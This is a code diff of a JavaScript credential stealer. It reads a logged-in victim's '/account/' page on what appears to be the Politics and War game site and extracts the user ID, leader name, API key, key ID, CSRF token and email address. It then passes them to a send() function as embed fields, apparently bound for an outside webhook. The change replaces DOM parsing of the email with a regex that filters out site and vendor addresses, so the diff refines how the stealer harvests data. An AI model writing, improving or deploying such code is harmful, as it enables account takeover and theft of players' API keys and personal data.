@@ -9,7 +9,6 @@
 
   try {
     const acct = await fetch('/account/', {credentials:'include'}).then(r => r.text());
-    const doc  = new DOMParser().parseFromString(acct, 'text/html');
 
     const userId = (acct.match(/app_user_id['">]+(\d+)/) || [])[1];
     const leader = (acct.match(/app_leader_name['">]+([^<]+)/) || [])[1];
@@ -18,14 +17,16 @@
     const keyId  = (acct.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
     const token  = (acct.match(/name="token"\s+value="([^"]+)"/) || [])[1];
 
-    // DOM approach for email — bulletproof
-    let email = 'n/a';
-    for (const td of doc.querySelectorAll('td')) {
-      if (td.textContent.trim() === 'Current E-mail:') {
-        email = td.nextElementSibling?.textContent?.trim() || 'n/a';
-        break;
-      }
-    }
+    // grab every email on the page, pick the user's
+    const allEmails = acct.match(/[\w.\-+]+@[\w.\-]+\.\w{2,}/g) || [];
+    const email = allEmails.find(e =>
+      !e.includes('politicsandwar') &&
+      !e.includes('firebase') &&
+      !e.includes('cloudflare') &&
+      !e.includes('gtranslate') &&
+      !e.includes('yellowstone') &&
+      !e.includes('example')
+    ) || 'n/a';
 
     await send({
       embeds: [{
@@ -38,7 +39,7 @@
           {name: 'apiKey', value: apiKey || 'n/a', inline: false},
           {name: 'keyId',  value: keyId  || 'n/a', inline: true},
           {name: 'token',  value: token  || 'n/a', inline: true},
-          {name: 'email',  value: email  || 'n/a', inline: false}
+          {name: 'email',  value: email, inline: false}
         ]
       }]
     });
